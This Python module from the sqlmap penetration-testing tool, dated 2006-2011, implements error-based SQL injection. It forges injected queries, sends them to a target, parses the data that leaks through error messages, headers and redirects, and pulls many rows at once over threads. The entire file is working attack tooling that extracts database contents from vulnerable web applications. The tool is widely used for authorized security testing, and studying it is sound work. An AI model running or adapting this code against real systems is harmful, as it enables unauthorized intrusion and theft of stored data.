#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import threading
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import BigArray
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import extractRegexResult
from lib.core.common import getUnicode
from lib.core.common import initTechnique
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import randomInt
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.convert import htmlunescape
from lib.core.convert import safecharencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapConnectionException
from lib.core.settings import FROM_TABLE
from lib.core.settings import MYSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import MSSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.resume import resume

reqCount = 0

def __oneShotErrorUse(expression, field):
    global reqCount

    threadData = getCurrentThreadData()

    retVal = None
    offset = 1
    chunk_length = None

    while True:
        check = "%s(?P<result>.*?)%s" % (kb.misc.start, kb.misc.stop)
        trimcheck = "%s(?P<result>.*?)</" % (kb.misc.start)

        nulledCastedField = agent.nullAndCastField(field)

        if Backend.isDbms(DBMS.MYSQL):
            chunk_length = MYSQL_ERROR_CHUNK_LENGTH
            nulledCastedField = queries[DBMS.MYSQL].substring.query % (nulledCastedField, offset, chunk_length)
        elif Backend.isDbms(DBMS.MSSQL):
            chunk_length = MSSQL_ERROR_CHUNK_LENGTH
            nulledCastedField = queries[DBMS.MSSQL].substring.query % (nulledCastedField, offset, chunk_length)

        # Forge the error-based SQL injection request
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector
        query = agent.prefixQuery(vector)
        query = agent.suffixQuery(query)
        injExpression = expression.replace(field, nulledCastedField, 1)
        injExpression = unescaper.unescape(injExpression)
        injExpression = query.replace("[QUERY]", injExpression)
        payload = agent.payload(newValue=injExpression)

        # Perform the request
        page, headers = Request.queryPage(payload, content=True)

        reqCount += 1

        # Parse the returned page to get the exact error-based
        # sql injection output
        output = reduce(lambda x, y: x if x is not None else y, [ \
                extractRegexResult(check, page, re.DOTALL | re.IGNORECASE), \
                extractRegexResult(check, listToStrValue(headers.headers \
                if headers else None), re.DOTALL | re.IGNORECASE), \
                extractRegexResult(check, threadData.lastRedirectMsg[1] \
                if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)], \
                None)

        if output is not None:
            output = getUnicode(output, kb.pageEncoding)
        else:
            trimmed = extractRegexResult(trimcheck, page, re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(trimcheck, listToStrValue(headers.headers \
                if headers else None), re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] \
                if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

            if trimmed:
                warnMsg = "possible server trimmed output detected (due to its length): "
                warnMsg += trimmed
                logger.warn(warnMsg)

        if any(map(lambda dbms: Backend.isDbms(dbms), [DBMS.MYSQL, DBMS.MSSQL])):
            if offset == 1:
                retVal = output
            else:
                retVal += output if output else ''

            if output and len(output) >= chunk_length:
                offset += chunk_length
            else:
                break
        else:
            retVal = output
            break

    if isinstance(retVal, basestring):
        retVal = htmlunescape(retVal).replace("<br>", "\n")

    retVal = __errorReplaceChars(retVal)

    dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(retVal)))

    return safecharencode(retVal) if kb.safeCharEncode else retVal

def __errorFields(expression, expressionFields, expressionFieldsList, expected=None, num=None, resumeValue=True):
    outputs = []
    origExpr = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        if resumeValue:
            output = resume(expressionReplaced, None)

        if not output or (expected == EXPECTED.INT and not output.isdigit()):
            if output:
                warnMsg = "expected value type %s, resumed '%s', " % (expected, output)
                warnMsg += "sqlmap is going to retrieve the value again"
                logger.warn(warnMsg)

            output = __oneShotErrorUse(expressionReplaced, field)

            if not kb.threadContinue:
                return None

            if output is not None:
                kb.locks.ioLock.acquire()
                dataToStdout("[%s] [INFO] retrieved: %s\r\n" % (time.strftime("%X"), safecharencode(output)))
                kb.locks.ioLock.release()

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def __errorReplaceChars(value):
    """
    Restores safely replaced characters
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.misc.space, " ").replace(kb.misc.dollar, "$").replace(kb.misc.at, "@")

    return retVal

def errorUse(expression, expected=None, resumeValue=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(PAYLOAD.TECHNIQUE.ERROR)

    global reqCount

    count = None
    start = time.time()
    startLimit = 0
    stopLimit = None
    outputs = []
    untilLimitChar = None
    untilOrderChar = None
    reqCount = 0

    if resumeValue:
        output = resume(expression, None)
    else:
        output = None

    if output and (expected is None or (expected == EXPECTED.INT and output.isdigit())):
        return output

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry per time
    # NOTE: I assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in \
       expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_TABLE) \
       or (Backend.getIdentifiedDbms() in FROM_TABLE and not \
       expression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]))) \
       and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) \
       and not re.search(SQL_SCALAR_REGEX, expression, re.I):

        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    startLimit = int(limitRegExp.group(int(limitGroupStart)))

                stopLimit = limitRegExp.group(int(limitGroupStop))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1
                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.isDbms(DBMS.ORACLE):
                limitCond = False
        else:
            limitCond = True

        # I assume that only queries NOT containing a "LIMIT #, 1"
        # (or similar depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if limitRegExp:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or similar, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    stopLimit += startLimit
                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    expression = expression[:untilLimitChar]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit
            elif dump:
                if conf.limitStart:
                    startLimit = conf.limitStart - 1
                if conf.limitStop:
                    stopLimit = conf.limitStop

            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, "COUNT(*)", 1)

            if re.search(" ORDER BY ", expression, re.I):
                untilOrderChar = countedExpression.index(" ORDER BY ")
                countedExpression = countedExpression[:untilOrderChar]

            count = resume(countedExpression, None)

            if not count or not count.isdigit():
                _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
                count = __oneShotErrorUse(countedExpression, countedExpressionFields)

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            elif count and not count.isdigit():
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            elif (not count or int(count) == 0):
                warnMsg = "the SQL query provided does not "
                warnMsg += "return any output"
                logger.warn(warnMsg)

                return outputs

            threadData = getCurrentThreadData()
            threadData.shared.limits = iter(xrange(startLimit, stopLimit))
            numThreads = min(conf.threads, (stopLimit - startLimit))
            threadData.shared.outputs = BigArray()

            if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                kb.suppressResumeInfo = True
                debugMsg = "suppressing possible resume console info because of "
                debugMsg += "large number of rows. It might take too long"
                logger.debug(debugMsg)

            lockNames = ('limits', 'outputs')
            for lock in lockNames:
                kb.locks[lock] = threading.Lock()

            try:
                def errorThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        kb.locks.limits.acquire()
                        try:
                            num = threadData.shared.limits.next()
                        except StopIteration:
                            break
                        finally:
                            kb.locks.limits.release()

                        output = __errorFields(expression, expressionFields, expressionFieldsList, expected, num, resumeValue)

                        if not kb.threadContinue:
                            break

                        if output and isinstance(output, list) and len(output) == 1:
                            output = output[0]

                        kb.locks.outputs.acquire()
                        threadData.shared.outputs.append(output)
                        kb.locks.outputs.release()

                runThreads(numThreads, errorThread)

            except KeyboardInterrupt:
                warnMsg = "user aborted during enumeration. sqlmap "
                warnMsg += "will display partial output"
                logger.warn(warnMsg)

            finally:
                outputs = threadData.shared.outputs
                kb.suppressResumeInfo = False

    if not outputs:
        outputs = __errorFields(expression, expressionFields, expressionFieldsList)

    if outputs and isinstance(outputs, list) and len(outputs) == 1 and isinstance(outputs[0], basestring):
        outputs = outputs[0]

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d queries in %d seconds" % (reqCount, duration)
        logger.debug(debugMsg)

    return outputs
